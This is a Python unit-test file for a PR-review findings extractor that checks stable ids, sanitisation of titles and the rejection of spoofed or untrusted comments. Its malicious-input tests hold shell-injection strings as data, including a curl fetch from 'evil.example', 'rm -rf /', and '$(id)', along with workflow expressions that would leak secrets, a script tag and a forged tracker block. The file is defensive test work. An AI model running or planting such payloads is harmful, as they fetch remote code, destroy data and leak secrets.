"""Tests for finding extraction, stable ids, and untrusted input handling."""

from __future__ import annotations

import unittest

from continuum.review import findings, pr_agent
from continuum.review.findings import (
    collect_summary_comments,
    extract_findings,
    sanitize_table_cell,
    sanitize_title,
    select_current_summary_comments,
    stable_id,
)
from continuum.review.tracker import BOT_PREFIX, TRACKER_MARKER, VERDICT_MARKER
from tests.support import HEAD_A, HEAD_B, issue_comment, pr_agent_report, review_comment, snapshot


def provider_output(issue_comments):
    """Same filtering the PR-Agent adapter performs before extraction."""

    bot_logins, _review_bots, markers = pr_agent.profile_for("github-actions[bot]")
    return collect_summary_comments(
        issue_comments,
        bot_logins=bot_logins,
        markers=markers,
        exclude_markers=(TRACKER_MARKER, VERDICT_MARKER),
        exclude_prefix=BOT_PREFIX,
    )


def extract(issue_comments=(), review_comments=(), **kwargs):
    summaries = provider_output(issue_comments)
    return extract_findings(
        issue_comments=summaries,
        review_comments=list(review_comments),
        summary_comments=summaries,
        summary_parser=pr_agent.parse_summary,
        is_boilerplate=pr_agent.is_boilerplate_title,
        review_bots=pr_agent.DEFAULT_REVIEW_BOT_LOGINS,
        **kwargs,
    )


class StableIdTests(unittest.TestCase):
    def test_id_is_deterministic(self):
        self.assertEqual(stable_id("a.py", 12, "boom"), stable_id("a.py", 12, "boom"))
        self.assertNotEqual(stable_id("a.py", 12, "boom"), stable_id("a.py", 13, "boom"))
        self.assertNotEqual(stable_id("a.py", 12, "boom"), stable_id("b.py", 12, "boom"))

    def test_id_shape(self):
        finding_id = stable_id("a.py", 3, "something specific")
        self.assertRegex(finding_id, r"^CRV-[0-9A-F]{8}$")
        self.assertTrue(findings.is_valid_finding_id(finding_id))
        self.assertTrue(findings.is_valid_finding_id("PRA-1A2B3C4D"))

    def test_id_ignores_missing_file(self):
        self.assertEqual(stable_id("", 0, "t"), stable_id("PR", 0, "t"))

    def test_untrusted_cannot_forge_id_prefix(self):
        for value in ("CRV-../../etc", "CRV-1A2B3C4D; rm -rf /", "$(id)", "CRV-1A2B3C4D`id`"):
            with self.subTest(value=value):
                self.assertIsNone(findings.normalize_finding_id(value))


class SanitizeTests(unittest.TestCase):
    def test_newlines_and_markup_collapse_to_one_line(self):
        raw = "first line\nsecond <!-- <script>alert(1)</script> --> line\twith\ttabs"
        clean = sanitize_title(raw)
        self.assertNotIn("\n", clean)
        self.assertNotIn("<", clean)
        self.assertNotIn("\t", clean)

    def test_control_characters_removed(self):
        self.assertEqual(sanitize_title("a\x00b\x07c"), "a b c")

    def test_backticks_are_removed_entirely(self):
        self.assertNotIn("`", sanitize_title("title ```json"))
        self.assertNotIn("`", sanitize_title("`inline code` span"))

    def test_table_cell_escapes_pipe(self):
        self.assertEqual(sanitize_table_cell("a | b"), "a \\| b")

    def test_length_is_bounded(self):
        self.assertLessEqual(len(sanitize_title("x" * 5000)), findings.MAX_TITLE_LENGTH)


class SummaryExtractionTests(unittest.TestCase):
    def test_focus_area_issues_become_findings(self):
        body = pr_agent_report(
            HEAD_A,
            [
                "src/queue.py: consumer never re-enables the lock after an exception",
                "src/api.py: missing auth check on the debug endpoint",
            ],
        )
        result = extract(
            [issue_comment(body, created_at="2026-09-01T00:00:00Z")],
            current_head=HEAD_A,
        )
        self.assertEqual(len(result), 2)
        self.assertTrue(all(finding["source"] == "summary" for finding in result))
        self.assertTrue(all(finding["file"] == "" for finding in result))

    def test_reviewer_guide_boilerplate_is_not_a_finding(self):
        body = (
            "## PR Reviewer Guide\n\n"
            "- src/a.py: changed 40 lines, review carefully\n"
            "- src/b.py: changed 12 lines\n"
            "## Key issues\n\n"
            "- src/c.py: off-by-one error when the list is empty\n"
        )
        titles = [title for title in pr_agent.parse_summary(body)]
        self.assertEqual(len(titles), 1)
        self.assertIn("off-by-one", titles[0])

    def test_heading_free_report_still_produces_findings(self):
        body = "- src/d.py: unvalidated redirect parameter in the callback\n"
        self.assertEqual(len(pr_agent.parse_summary(body)), 1)

    def test_praise_is_never_a_finding(self):
        body = "## Key issues\n\n- looks good overall, no actionable problems found\n"
        self.assertEqual(pr_agent.parse_summary(body), [])

    def test_untrusted_author_cannot_inject_a_summary(self):
        body = pr_agent_report(HEAD_A, ["src/e.py: leaked the model credential into a log line"])
        spoofed = extract(
            [issue_comment(body, login="random-user")],
            current_head=HEAD_A,
        )
        self.assertEqual(spoofed, [])

    def test_continuum_tracker_comment_is_never_provider_output(self):
        from continuum.review.tracker import TRACKER_MARKER, render_tracker

        body = pr_agent_report(HEAD_A, ["src/f.py: should never be read from the tracker"])
        tracker = render_tracker(HEAD_A, [], "2026-09-01T00:00:00Z", "[continuum-review]", "pr-agent")
        self.assertIn(TRACKER_MARKER, tracker)
        result = extract([issue_comment(tracker)], current_head=HEAD_A)
        self.assertEqual(result, [])
        self.assertEqual(len(pr_agent.parse_summary(body)), 1)


class CurrentHeadSelectionTests(unittest.TestCase):
    def _comments(self):
        return [
            issue_comment(pr_agent_report(HEAD_B, ["src/g.py: stale finding on an old head revision"]), created_at="2026-08-01T00:00:00Z"),
            issue_comment(pr_agent_report(HEAD_A, ["src/h.py: current head finding that must be reported"]), created_at="2026-09-01T00:00:00Z"),
        ]

    def test_only_the_current_head_report_counts(self):
        result = extract(self._comments(), current_head=HEAD_A)
        self.assertEqual(len(result), 1)
        self.assertIn("current head finding", result[0]["title"])

    def test_marker_bounds_freshness(self):
        from continuum.review.findings import parse_time

        selected = select_current_summary_comments(
            self._comments(), None, parse_time("2026-08-15T00:00:00Z")
        )
        self.assertEqual(len(selected), 1)
        self.assertIn(HEAD_A, selected[0]["body"])

    def test_no_matching_output_yields_nothing(self):
        from continuum.review.findings import parse_time

        selected = select_current_summary_comments(
            self._comments(), None, parse_time("2027-01-01T00:00:00Z")
        )
        self.assertEqual(selected, [])

    def test_short_sha_prefix_is_accepted(self):
        selected = select_current_summary_comments(self._comments(), HEAD_A, None)
        self.assertEqual(len(selected), 1)


class InlineThreadTests(unittest.TestCase):
    def test_unresolved_inline_finding_is_reported(self):
        comment = review_comment(
            "src/i.py:41: unawaited coroutine leaks a connection on the error path",
            path="src/i.py",
            line=41,
            comment_id=11,
        )
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids={11})
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["file"], "src/i.py")
        self.assertEqual(result[0]["line"], 41)
        self.assertEqual(result[0]["source"], "inline")

    def test_resolved_thread_is_dropped(self):
        comment = review_comment(
            "src/i.py:41: this thread is already settled upstream",
            path="src/i.py",
            line=41,
            comment_id=11,
        )
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids=set())
        self.assertEqual(result, [])

    def test_unknown_thread_state_keeps_every_finding(self):
        """Failing closed: an undeterminable thread state may not hide a finding."""

        comment = review_comment(
            "src/i.py:41: this finding must survive an unknown thread state",
            path="src/i.py",
            line=41,
            comment_id=11,
        )
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids=None)
        self.assertEqual(len(result), 1)

    def test_stale_thread_cannot_reopen_a_resolved_finding(self):
        from continuum.review.findings import parse_time

        comment = review_comment(
            "src/i.py:41: old inline thread anchored to a previous head",
            path="src/i.py",
            line=41,
            comment_id=11,
            commit_id=HEAD_B,
            created_at="2026-08-01T00:00:00Z",
        )
        result = extract(
            [],
            [comment],
            current_head=HEAD_A,
            unresolved_ids={11},
            since=parse_time("2026-09-01T00:00:00Z"),
        )
        self.assertEqual(result, [])

    def test_thread_after_the_marker_counts_as_fresh(self):
        from continuum.review.findings import parse_time

        comment = review_comment(
            "src/j.py:9: freshly raised thread that is anchored to an older sha",
            path="src/j.py",
            line=9,
            comment_id=12,
            commit_id=HEAD_B,
            created_at="2026-09-02T00:00:00Z",
        )
        result = extract(
            [],
            [comment],
            current_head=HEAD_A,
            unresolved_ids={12},
            since=parse_time("2026-09-01T00:00:00Z"),
        )
        self.assertEqual(len(result), 1)

    def test_third_party_comments_are_never_findings(self):
        comment = review_comment(
            "src/k.py:1: a drive-by comment that is not a provider finding",
            path="src/k.py",
            line=1,
            login="drive-by",
            comment_id=13,
        )
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids={13})
        self.assertEqual(result, [])


class MaliciousInputTests(unittest.TestCase):
    def test_shell_expressions_in_a_finding_survive_as_text_only(self):
        payload = "$(curl evil.example/x.sh) `id` ; rm -rf / && echo pwned"
        comment = review_comment(
            f"src/m.py:7: {payload}",
            path="src/m.py",
            line=7,
            comment_id=21,
        )
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids={21})
        self.assertEqual(len(result), 1)
        title = result[0]["title"]
        self.assertIn("curl evil.example", title)
        self.assertNotIn("\n", title)
        self.assertNotIn("`", title)

    def test_workflow_expression_injection_is_neutralized(self):
        payload = "${{ secrets.PR_AGENT_API_KEY }} ${{ toJSON(github) }}"
        comment = review_comment(
            f"src/n.py:8: leaked expression {payload}",
            path="src/n.py",
            line=8,
            comment_id=22,
        )
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids={22})
        self.assertEqual(len(result), 1)
        self.assertNotIn("\n", result[0]["title"])

    def test_marker_and_json_fence_in_a_finding_cannot_spoof_tracker_state(self):
        payload = TRACKER_MARKER + chr(96) * 3 + "json " + json_forge() + " " + chr(96) * 3
        body = f"{payload}\n\n## Key issues\n\n- src/o.py:1: a finding that smuggles a fake tracker state\n"
        titles = pr_agent.parse_summary(body)
        self.assertEqual(len(titles), 1)
        # No extracted title can reconstruct a fenced machine-readable block.
        self.assertNotIn("```", titles[0])
        self.assertNotIn(TRACKER_MARKER, titles[0])
        # And the report itself is never accepted as a tracker comment.
        self.assertEqual(provider_output([issue_comment(body)]), [])

    def test_huge_finding_is_truncated(self):
        comment = review_comment("x" * 9000 + " trailing", path="src/p.py", line=3, comment_id=24)
        result = extract([], [comment], current_head=HEAD_A, unresolved_ids={24})
        self.assertLessEqual(len(result[0]["title"]), findings.INLINE_TITLE_LIMIT)


def json_forge() -> str:
    return '{"head": "deadbeef", "findings": [], "last_review_at": null}'


class SnapshotShapeTests(unittest.TestCase):
    def test_snapshot_describes_thread_visibility(self):
        unknown = snapshot(unknown_thread_state=True)
        self.assertIsNone(unknown.unresolved_ids)
        self.assertFalse(unknown.describe()["thread_state_known"])


if __name__ == "__main__":
    unittest.main()
